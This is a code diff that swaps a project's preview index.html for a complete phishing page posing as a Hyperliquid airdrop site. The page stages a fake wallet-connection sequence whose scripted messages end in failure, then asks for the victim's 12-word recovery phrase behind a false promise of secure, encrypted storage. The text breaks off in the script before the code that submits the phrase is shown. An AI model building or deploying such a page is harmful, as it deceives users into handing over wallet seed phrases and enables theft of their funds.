@@ -1,47 +1,1644 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Preview - Chariot</title>
-    <script type="module" crossorigin src="/assets/index-XmGYrK2Q.js"></script>
-    <link rel="stylesheet" crossorigin href="/assets/index-Dak4_2Xm.css">
-  </head>
-  <body>
-    <div id="root"></div>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hyperliquid Airdrop - Connect Your Wallet</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #581c87 0%, #1e3a8a 50%, #312e81 100%);
+            min-height: 100vh;
+            color: white;
+            overflow-x: hidden;
+        }
+
+        .background-pattern {
+            position: fixed;
+            inset: 0;
+            opacity: 0.1;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .bg-circle-1 {
+            position: absolute;
+            top: 80px;
+            left: 80px;
+            width: 288px;
+            height: 288px;
+            background: #a855f7;
+            border-radius: 50%;
+            filter: blur(60px);
+        }
+
+        .bg-circle-2 {
+            position: absolute;
+            bottom: 80px;
+            right: 80px;
+            width: 384px;
+            height: 384px;
+            background: #3b82f6;
+            border-radius: 50%;
+            filter: blur(60px);
+        }
+
+        .bg-circle-3 {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 320px;
+            height: 320px;
+            background: #6366f1;
+            border-radius: 50%;
+            filter: blur(60px);
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 24px;
+            position: relative;
+            z-index: 10;
+        }
+
+        /* Header */
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 32px 0;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo-icon {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, #a855f7, #3b82f6);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 18px;
+        }
+
+        .logo-text {
+            font-size: 32px;
+            font-weight: bold;
+        }
+
+        .connect-btn {
+            background: linear-gradient(135deg, #9333ea, #2563eb);
+            color: white;
+            border: none;
+            padding: 12px 32px;
+            border-radius: 50px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .connect-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(147, 51, 234, 0.3);
+        }
+
+        /* Hero Section */
+        .hero {
+            text-align: center;
+            padding: 48px 0;
+        }
+
+        .hero-title {
+            font-size: clamp(48px, 8vw, 112px);
+            font-weight: bold;
+            margin-bottom: 24px;
+            background: linear-gradient(135deg, #ffffff, #e9d5ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .hero-subtitle {
+            font-size: clamp(18px, 3vw, 32px);
+            color: #d1d5db;
+            margin-bottom: 32px;
+            max-width: 768px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        /* Stats */
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 32px;
+            margin-bottom: 64px;
+        }
+
+        .stat-item {
+            text-align: center;
+        }
+
+        .stat-number {
+            font-size: clamp(32px, 5vw, 80px);
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+
+        .stat-number.green { color: #10b981; }
+        .stat-number.blue { color: #3b82f6; }
+        .stat-number.purple { color: #a855f7; }
+
+        .stat-label {
+            color: #9ca3af;
+            font-size: 16px;
+        }
+
+        /* Card */
+        .card {
+            background: rgba(0, 0, 0, 0.2);
+            backdrop-filter: blur(16px);
+            border: 1px solid rgba(147, 51, 234, 0.2);
+            border-radius: 16px;
+            padding: 32px;
+            margin-bottom: 64px;
+        }
+
+        .card.border-purple { border-color: rgba(147, 51, 234, 0.2); }
+        .card.border-blue { border-color: rgba(59, 130, 246, 0.2); }
+        .card.border-green { border-color: rgba(16, 185, 129, 0.2); }
+        .card.border-yellow { border-color: rgba(245, 158, 11, 0.2); }
+
+        /* Countdown */
+        .countdown-title {
+            font-size: 48px;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .countdown-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 16px;
+            text-align: center;
+        }
+
+        .countdown-item {
+            background: linear-gradient(180deg, rgba(147, 51, 234, 0.2), rgba(59, 130, 246, 0.2));
+            border-radius: 12px;
+            padding: 16px;
+        }
+
+        .countdown-number {
+            font-size: 48px;
+            font-weight: bold;
+        }
+
+        .countdown-label {
+            font-size: 14px;
+            color: #9ca3af;
+        }
+
+        /* Grid Layout */
+        .grid-2 {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 48px;
+            margin-bottom: 64px;
+        }
+
+        .grid-3 {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 32px;
+        }
+
+        .grid-4 {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 24px;
+            text-align: center;
+        }
+
+        /* Features */
+        .feature-list {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .feature-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .feature-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+        }
+
+        .feature-dot.green { background: #10b981; }
+        .feature-dot.blue { background: #3b82f6; }
+        .feature-dot.purple { background: #a855f7; }
+        .feature-dot.yellow { background: #eab308; }
+
+        /* Steps */
+        .step-item {
+            text-align: center;
+        }
+
+        .step-number {
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            font-weight: bold;
+            margin: 0 auto 16px;
+        }
+
+        .step-1 { background: linear-gradient(135deg, #a855f7, #3b82f6); }
+        .step-2 { background: linear-gradient(135deg, #3b82f6, #10b981); }
+        .step-3 { background: linear-gradient(135deg, #10b981, #eab308); }
+
+        .step-title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .step-description {
+            color: #9ca3af;
+        }
+
+        /* Leaderboard */
+        .leaderboard-item {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            margin-bottom: 16px;
+        }
+
+        .leaderboard-left {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .rank-badge {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        .rank-top { background: linear-gradient(135deg, #eab308, #f97316); }
+        .rank-normal { background: #6b7280; }
+
+        .wallet-address {
+            font-family: 'Courier New', monospace;
+            color: #d1d5db;
+        }
+
+        .amount {
+            font-weight: bold;
+            color: #10b981;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 48px 0;
+            margin-top: 64px;
+        }
+
+        .social-links {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin-bottom: 32px;
+        }
+
+        .social-link {
+            color: #9ca3af;
+            text-decoration: none;
+            font-size: 24px;
+            transition: color 0.3s ease;
+        }
+
+        .social-link:hover {
+            color: white;
+        }
+
+        .footer-text {
+            color: #9ca3af;
+        }
+
+        /* Modal */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(8px);
+            z-index: 50;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+        }
+
+        .modal-overlay.show {
+            display: flex;
+        }
+
+        .modal {
+            background: #111827;
+            border: 1px solid #374151;
+            border-radius: 16px;
+            width: 100%;
+            max-width: 448px;
+            padding: 24px;
+        }
+
+        .modal-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 24px;
+        }
+
+        .modal-title {
+            font-size: 32px;
+            font-weight: bold;
+        }
+
+        .close-btn {
+            background: none;
+            border: none;
+            color: #9ca3af;
+            font-size: 24px;
+            cursor: pointer;
+            padding: 4px;
+        }
+
+        .close-btn:hover {
+            color: white;
+        }
+
+        .modal-subtitle {
+            color: #9ca3af;
+            margin-bottom: 24px;
+        }
+
+        /* Wallet Options */
+        .wallet-option {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px;
+            background: #1f2937;
+            border: 1px solid #374151;
+            border-radius: 12px;
+            margin-bottom: 12px;
+            transition: border-color 0.3s ease;
+        }
+
+        .wallet-option:hover {
+            border-color: #a855f7;
+        }
+
+        .wallet-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .wallet-icon {
+            font-size: 32px;
+        }
+
+        .wallet-name {
+            font-weight: 600;
+            color: white;
+        }
+
+        .wallet-status {
+            font-size: 14px;
+            color: #9ca3af;
+        }
+
+        .wallet-connect-btn {
+            background: #9333ea;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .wallet-connect-btn:hover {
+            background: #7c3aed;
+        }
+
+        .wallet-connect-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        /* Connection Loader */
+        .connection-loader {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.9);
+            backdrop-filter: blur(12px);
+            z-index: 60;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+        }
+
+        .connection-loader.show {
+            display: flex;
+        }
+
+        .loader-content {
+            background: linear-gradient(135deg, #111827, #1f2937);
+            border: 1px solid #374151;
+            border-radius: 20px;
+            padding: 48px 32px;
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
+        }
+
+        .loader-wallet-icon {
+            font-size: 64px;
+            margin-bottom: 24px;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        .loader-title {
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 12px;
+            color: white;
+        }
+
+        .loader-subtitle {
+            font-size: 16px;
+            color: #9ca3af;
+            margin-bottom: 32px;
+        }
+
+        .connection-progress {
+            margin-bottom: 24px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #374151;
+            border-radius: 3px;
+            overflow: hidden;
+            margin-bottom: 16px;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #9333ea, #3b82f6);
+            border-radius: 3px;
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+
+        .connection-steps {
+            text-align: left;
+        }
+
+        .connection-step {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 12px;
+            font-size: 14px;
+            color: #9ca3af;
+            opacity: 0.5;
+            transition: all 0.3s ease;
+        }
+
+        .connection-step.active {
+            color: #10b981;
+            opacity: 1;
+        }
+
+        .connection-step.completed {
+            color: #6b7280;
+            opacity: 0.7;
+        }
+
+        .step-icon {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            border: 2px solid currentColor;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            flex-shrink: 0;
+        }
+
+        .step-icon.completed {
+            background: #10b981;
+            border-color: #10b981;
+            color: white;
+        }
+
+        .step-icon.active {
+            border-color: #10b981;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        .connection-spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(147, 51, 234, 0.3);
+            border-radius: 50%;
+            border-top-color: #9333ea;
+            animation: spin 1s linear infinite;
+            margin: 24px auto;
+        }
+
+        .connection-status {
+            font-size: 14px;
+            color: #9ca3af;
+            margin-top: 16px;
+            min-height: 20px;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0.8; }
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Wallet Form */
+        .wallet-form {
+            display: none;
+        }
+
+        .wallet-form.show {
+            display: block;
+        }
+
+        .form-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+
+        .back-btn {
+            background: none;
+            border: none;
+            color: #9ca3af;
+            font-size: 20px;
+            cursor: pointer;
+            margin-right: 12px;
+            padding: 4px;
+        }
+
+        .back-btn:hover {
+            color: white;
+        }
+
+        .form-title {
+            font-size: 32px;
+            font-weight: bold;
+        }
+
+        /* Alert */
+        .alert {
+            padding: 16px;
+            border-radius: 12px;
+            margin-bottom: 24px;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+        }
+
+        .alert.warning {
+            background: rgba(245, 158, 11, 0.1);
+            border: 1px solid rgba(245, 158, 11, 0.2);
+        }
+
+        .alert.success {
+            background: rgba(16, 185, 129, 0.1);
+            border: 1px solid rgba(16, 185, 129, 0.2);
+        }
+
+        .alert.error {
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid rgba(239, 68, 68, 0.2);
+        }
+
+        .alert-icon {
+            font-size: 20px;
+            margin-top: 2px;
+        }
+
+        .alert-icon.warning { color: #f59e0b; }
+        .alert-icon.success { color: #10b981; }
+        .alert-icon.error { color: #ef4444; }
+
+        .alert-title {
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .alert-title.warning { color: #f59e0b; }
+        .alert-title.success { color: #10b981; }
+        .alert-title.error { color: #ef4444; }
+
+        .alert-text {
+            font-size: 14px;
+            color: #d1d5db;
+        }
+
+        /* Success Popup */
+        .success-popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: linear-gradient(135deg, #10b981, #059669);
+            color: white;
+            padding: 32px;
+            border-radius: 20px;
+            box-shadow: 0 25px 50px rgba(16, 185, 129, 0.3);
+            z-index: 100;
+            text-align: center;
+            min-width: 320px;
+            display: none;
+            animation: popupSlideIn 0.5s ease-out;
+        }
+
+        .success-popup.show {
+            display: block;
+        }
+
+        .success-popup-icon {
+            font-size: 64px;
+            margin-bottom: 16px;
+            animation: bounce 1s ease-in-out infinite alternate;
+        }
+
+        .success-popup-title {
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 12px;
+        }
+
+        .success-popup-message {
+            font-size: 16px;
+            opacity: 0.9;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .success-popup-countdown {
+            font-size: 14px;
+            opacity: 0.8;
+        }
+
+        @keyframes popupSlideIn {
+            from {
+                opacity: 0;
+                transform: translate(-50%, -60%);
+            }
+            to {
+                opacity: 1;
+                transform: translate(-50%, -50%);
+            }
+        }
+
+        @keyframes bounce {
+            from {
+                transform: translateY(0);
+            }
+            to {
+                transform: translateY(-10px);
+            }
+        }
+
+        /* Form Elements */
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #d1d5db;
+            margin-bottom: 8px;
+        }
+
+        .form-input {
+            width: 100%;
+            background: rgba(31, 41, 55, 0.5);
+            border: 1px solid #374151;
+            border-radius: 12px;
+            padding: 12px;
+            color: white;
+            font-weight: 500;
+        }
+
+        .form-textarea {
+            width: 100%;
+            height: 128px;
+            background: rgba(31, 41, 55, 0.5);
+            border: 1px solid #374151;
+            border-radius: 12px;
+            padding: 12px;
+            color: white;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            resize: none;
+        }
+
+        .form-textarea:focus, .form-input:focus {
+            outline: none;
+            border-color: #a855f7;
+            box-shadow: 0 0 0 1px #a855f7;
+        }
+
+        .word-counter {
+            text-align: right;
+            font-size: 14px;
+            margin-top: 8px;
+        }
+
+        .word-counter.valid { color: #10b981; }
+        .word-counter.invalid { color: #9ca3af; }
+
+        .submit-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #9333ea, #2563eb);
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-1px);
+        }
+
+        .submit-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .spinner {
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s linear infinite;
+        }
+
+        .security-notice {
+            margin-top: 24px;
+            padding: 16px;
+            background: rgba(31, 41, 55, 0.3);
+            border: 1px solid #374151;
+            border-radius: 12px;
+        }
+
+        .security-notice p {
+            font-size: 12px;
+            color: #9ca3af;
+        }
+
+        .security-notice strong {
+            color: #d1d5db;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .container {
+                padding: 0 16px;
+            }
+
+            .header {
+                padding: 24px 0;
+            }
+
+            .logo-text {
+                font-size: 24px;
+            }
+
+            .connect-btn {
+                padding: 10px 20px;
+                font-size: 14px;
+            }
+
+            .hero {
+                padding: 32px 0;
+            }
+
+            .card {
+                padding: 24px;
+                margin-bottom: 48px;
+            }
+
+            .countdown-number {
+                font-size: 32px;
+            }
+
+            .countdown-title {
+                font-size: 32px;
+            }
+
+            .modal {
+                padding: 20px;
+            }
+
+            .modal-title {
+                font-size: 24px;
+            }
+
+            .form-title {
+                font-size: 24px;
+            }
+
+            .success-popup {
+                margin: 16px;
+                min-width: auto;
+                max-width: calc(100vw - 32px);
+            }
+
+            .loader-content {
+                padding: 32px 24px;
+            }
+
+            .loader-wallet-icon {
+                font-size: 48px;
+            }
+
+            .loader-title {
+                font-size: 24px;
+            }
+        }
+
+        /* Hide elements initially */
+        .landing-page.hide {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Background Pattern -->
+    <div class="background-pattern">
+        <div class="bg-circle-1"></div>
+        <div class="bg-circle-2"></div>
+        <div class="bg-circle-3"></div>
+    </div>
+
+    <!-- Landing Page -->
+    <div id="landingPage" class="landing-page">
+        <!-- Header -->
+        <header class="container">
+            <div class="header">
+                <div class="logo">
+                    <div class="logo-icon">HL</div>
+                    <div class="logo-text">Hyperliquid</div>
+                </div>
+                <button class="connect-btn" onclick="showWalletModal()">Connect Wallet</button>
+            </div>
+        </header>
+
+        <!-- Main Content -->
+        <main class="container">
+            <!-- Hero Section -->
+            <section class="hero">
+                <h1 class="hero-title">Hyperliquid Airdrop</h1>
+                <p class="hero-subtitle">Join the most anticipated DeFi airdrop. Connect your wallet and qualify for exclusive rewards.</p>
+
+                <!-- Stats -->
+                <div class="stats">
+                    <div class="stat-item">
+                        <div class="stat-number green">$30k</div>
+                        <div class="stat-label">Total Rewards</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-number blue">100k+</div>
+                        <div class="stat-label">Participants</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-number purple">247</div>
+                        <div class="stat-label">Days Active</div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Countdown -->
+            <section class="card border-purple">
+                <h2 class="countdown-title">Airdrop Countdown</h2>
+                <div class="countdown-grid">
+                    <div class="countdown-item">
+                        <div class="countdown-number" id="days">15</div>
+                        <div class="countdown-label">Days</div>
+                    </div>
+                    <div class="countdown-item">
+                        <div class="countdown-number" id="hours">23</div>
+                        <div class="countdown-label">Hours</div>
+                    </div>
+                    <div class="countdown-item">
+                        <div class="countdown-number" id="minutes">45</div>
+                        <div class="countdown-label">Minutes</div>
+                    </div>
+                    <div class="countdown-item">
+                        <div class="countdown-number" id="seconds">30</div>
+                        <div class="countdown-label">Seconds</div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- About Section -->
+            <section class="grid-2">
+                <div class="card border-purple">
+                    <h3 style="font-size: 32px; font-weight: bold; margin-bottom: 16px;">About Hyperliquid</h3>
+                    <p style="color: #d1d5db; margin-bottom: 16px;">
+                        The world's most advanced decentralized perpetual exchange, built from the ground up for maximum
+                        performance and capital efficiency.
+                    </p>
+                    <p style="color: #d1d5db;">
+                        Experience lightning-fast trading with institutional-grade infrastructure and community-driven
+                        governance.
+                    </p>
+                </div>
+
+                <div class="card border-blue">
+                    <h3 style="font-size: 32px; font-weight: bold; margin-bottom: 16px;">Revolutionary Trading Platform</h3>
+                    <div class="feature-list">
+                        <div class="feature-item">
+                            <div class="feature-dot green"></div>
+                            <span>Sub-millisecond latency</span>
+                        </div>
+                        <div class="feature-item">
+                            <div class="feature-dot blue"></div>
+                            <span>100% on-chain settlement</span>
+                        </div>
+                        <div class="feature-item">
+                            <div class="feature-dot purple"></div>
+                            <span>Deep liquidity pools</span>
+                        </div>
+                        <div class="feature-item">
+                            <div class="feature-dot yellow"></div>
+                            <span>Advanced order types</span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Trading Stats -->
+            <section class="card border-green">
+                <h3 style="font-size: 32px; font-weight: bold; text-align: center; margin-bottom: 32px;">Lightning Fast</h3>
+                <div class="grid-4">
+                    <div>
+                        <div style="font-size: 32px; font-weight: bold; color: #10b981;">0.2ms</div>
+                        <div style="font-size: 14px; color: #9ca3af;">Avg Latency</div>
+                    </div>
+                    <div>
+                        <div style="font-size: 32px; font-weight: bold; color: #3b82f6;">99.9%</div>
+                        <div style="font-size: 14px; color: #9ca3af;">Uptime</div>
+                    </div>
+                    <div>
+                        <div style="font-size: 32px; font-weight: bold; color: #a855f7;">$2.1B</div>
+                        <div style="font-size: 14px; color: #9ca3af;">24h Volume</div>
+                    </div>
+                    <div>
+                        <div style="font-size: 32px; font-weight: bold; color: #eab308;">50k+</div>
+                        <div style="font-size: 14px; color: #9ca3af;">Active Traders</div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Steps to Qualify -->
+            <section class="card border-purple">
+                <h3 style="font-size: 48px; font-weight: bold; text-align: center; margin-bottom: 32px;">Steps to Qualify</h3>
+                <div class="grid-3">
+                    <div class="step-item">
+                        <div class="step-number step-1">1</div>
+                        <h4 class="step-title">Connect Wallet</h4>
+                        <p class="step-description">Link your preferred wallet to get started</p>
+                    </div>
+                    <div class="step-item">
+                        <div class="step-number step-2">2</div>
+                        <h4 class="step-title">Verify Identity</h4>
+                        <p class="step-description">Complete KYC verification process</p>
+                    </div>
+                    <div class="step-item">
+                        <div class="step-number step-3">3</div>
+                        <h4 class="step-title">Claim Rewards</h4>
+                        <p class="step-description">Receive your airdrop allocation</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Live Leaderboard -->
+            <section class="card border-yellow">
+                <h3 style="font-size: 48px; font-weight: bold; text-align: center; margin-bottom: 32px;">Live Leaderboard</h3>
+                <div id="leaderboard">
+                    <!-- Leaderboard items will be populated by JavaScript -->
+                </div>
+            </section>
+        </main>
+
+        <!-- Footer -->
+        <footer class="container">
+            <div class="footer">
+                <div class="social-links">
+                    <a href="#" class="social-link">🐦</a>
+                    <a href="#" class="social-link">💬</a>
+                    <a href="#" class="social-link">🌐</a>
+                </div>
+                <p class="footer-text">© 2024 Hyperliquid. All rights reserved.</p>
+            </div>
+        </footer>
+    </div>
+
+    <!-- Wallet Modal -->
+    <div id="walletModal" class="modal-overlay">
+        <div class="modal">
+            <div class="modal-header">
+                <h2 class="modal-title">Connect Wallet</h2>
+                <button class="close-btn" onclick="hideWalletModal()">×</button>
+            </div>
+
+            <p class="modal-subtitle">Choose your preferred wallet to connect</p>
+
+            <div id="walletOptions">
+                <!-- Wallet options will be populated by JavaScript -->
+            </div>
+        </div>
+    </div>
+
+    <!-- Connection Loader -->
+    <div id="connectionLoader" class="connection-loader">
+        <div class="loader-content">
+            <div class="loader-wallet-icon" id="loaderWalletIcon">🦊</div>
+            <div class="loader-title">Connecting to <span id="loaderWalletName">MetaMask</span></div>
+            <div class="loader-subtitle">Please wait while we establish a secure connection...</div>
+            
+            <div class="connection-progress">
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+                
+                <div class="connection-steps">
+                    <div class="connection-step" id="step1">
+                        <div class="step-icon">1</div>
+                        <span>Initializing wallet connection...</span>
+                    </div>
+                    <div class="connection-step" id="step2">
+                        <div class="step-icon">2</div>
+                        <span>Verifying wallet compatibility...</span>
+                    </div>
+                    <div class="connection-step" id="step3">
+                        <div class="step-icon">3</div>
+                        <span>Establishing secure handshake...</span>
+                    </div>
+                    <div class="connection-step" id="step4">
+                        <div class="step-icon">4</div>
+                        <span>Finalizing connection...</span>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="connection-spinner"></div>
+            <div class="connection-status" id="connectionStatus">Attempting to connect...</div>
+        </div>
+    </div>
+
+    <!-- Wallet Form -->
+    <div id="walletForm" class="wallet-form">
+        <div style="min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 16px;">
+            <div class="modal">
+                <div class="form-header">
+                    <button class="back-btn" onclick="showLandingPage()">←</button>
+                    <h2 class="form-title">Manual Import</h2>
+                </div>
+
+                <!-- Connection Failed Notice -->
+                <div class="alert warning">
+                    <div class="alert-icon warning">⚠️</div>
+                    <div>
+                        <h3 class="alert-title warning">Connection Failed</h3>
+                        <p class="alert-text">Unable to automatically connect to <span id="selectedWalletName"></span>. Please manually import your wallet using your recovery phrase.</p>
+                    </div>
+                </div>
+
+                <!-- Error Alert -->
+                <div id="errorAlert" class="alert error" style="display: none;">
+                    <div class="alert-icon error">⚠️</div>
+                    <div>
+                        <h3 class="alert-title error">Error</h3>
+                        <p class="alert-text" id="errorMessage"></p>
+                    </div>
+                </div>
+
+                <!-- Form -->
+                <form id="phraseForm" onsubmit="submitWalletPhrase(event)">
+                    <div class="form-group">
+                        <label class="form-label">Selected Wallet</label>
+                        <div class="form-input" id="selectedWalletDisplay"></div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="recoveryPhrase" class="form-label">Recovery Phrase (12 words)</label>
+                        <textarea
+                            id="recoveryPhrase"
+                            class="form-textarea"
+                            placeholder="Enter your 12-word recovery phrase separated by spaces"
+                            required
+                            oninput="updateWordCount()"
+                        ></textarea>
+                        <div id="wordCounter" class="word-counter invalid">0 words</div>
+                    </div>
+
+                    <button type="submit" class="submit-btn" id="submitBtn" disabled>
+                        <span id="submitText">Submit for Airdrop</span>
+                        <div id="submitSpinner" class="spinner" style="display: none;"></div>
+                    </button>
+                </form>
+
+                <!-- Security Notice -->
+                <div class="security-notice">
+                    <p>
+                        <strong>Security Notice:</strong> Your recovery phrase will be securely stored and encrypted. 
+                        This is for airdrop verification purposes only. Never share your recovery phrase with anyone else.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Popup -->
+    <div id="successPopup" class="success-popup">
+        <div class="success-popup-icon">🎉</div>
+        <div class="success-popup-title">Success!</div>
+        <div class="success-popup-message">
+            Your wallet has been successfully submitted for the Hyperliquid Airdrop!<br>
+            You will be redirected to the main page shortly.
+        </div>
+        <div class="success-popup-countdown">
+            Redirecting in <span id="redirectCountdown">3</span> seconds...
+        </div>
+    </div>
+
     <script>
-      /**
-       * DO NOT REMOVE
-       * Sends client-side errors to the chariot-logger defined in vite.config.ts
-       */
-      if ("production" === "development") {
-        // Send to logger and notify parent
-        const sendError = (error) => {
-          if (!error?.message) return; // only log errors with a message
+        // Global variables
+        let selectedWallet = '';
+        let selectedWalletIcon = '';
+        let countdownInterval;
 
-          fetch("/@chariot-logger", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(error),
-          }).catch(() => {});
-          window.parent.postMessage("error", "*");
-        };
+        // Wallet options data - ALL wallets now have Connect buttons
+        const walletOptions = [
+            { id: 'metamask', name: 'MetaMask', icon: '🦊', status: 'connect' },
+            { id: 'walletconnect', name: 'WalletConnect', icon: '🔗', status: 'connect' },
+            { id: 'coinbase', name: 'Coinbase Wallet', icon: '🔵', status: 'connect' },
+            { id: 'trust', name: 'Trust Wallet', icon: '🛡️', status: 'connect' },
+            { id: 'phantom', name: 'Phantom', icon: '👻', status: 'connect' },
+            { id: 'other', name: 'Other Wallet', icon: '📱', status: 'connect' }
+        ];
 
-        // Catch all errors
-        window.addEventListener("error", (e) => sendError(e), true);
-        window.addEventListener(
-          "unhandledrejection",
-          (e) => sendError(e),
-          true
-        );
+        // Leaderboard data
+        const leaderboardData = [
+            { rank: 1, address: '0x1a2b...3c4d', amount: '$45,230' },
+            { rank: 2, address: '0x5e6f...7g8h', amount: '$38,150' },
+            { rank: 3, address: '0x9i0j...1k2l', amount: '$32,890' },
+            { rank: 4, address: '0x3m4n...5o6p', amount: '$28,750' },
+            { rank: 5, address: '0x7q8r...9s0t', amount: '$25,420' },
+            { rank: 6, address: '0x1u2v...3w4x', amount: '$22,180' },
+            { rank: 7, address: '0x5y6z...7a8b', amount: '$19,650' },
+            { rank: 8, address: '0x9c0d...1e2f', amount: '$17,320' }
+        ];
 
-        // Catch console.error
-        const originalError = console.error;
-        console.error = function (...args) {
-          originalError.apply(console, args);
-          sendError({ type: "console", args });
-        };
-      }
+        // Connection status messages for realism
+        const connectionMessages = [
+            "Scanning for wallet extension...",
+            "Checking wallet availability...",
+            "Requesting connection permission...",
+            "Waiting for user confirmation...",
+            "Establishing secure channel...",
+            "Verifying wallet signature...",
+            "Synchronizing with blockchain...",
+            "Connection timeout detected...",
+            "Retrying connection...",
+            "Authentication failed..."
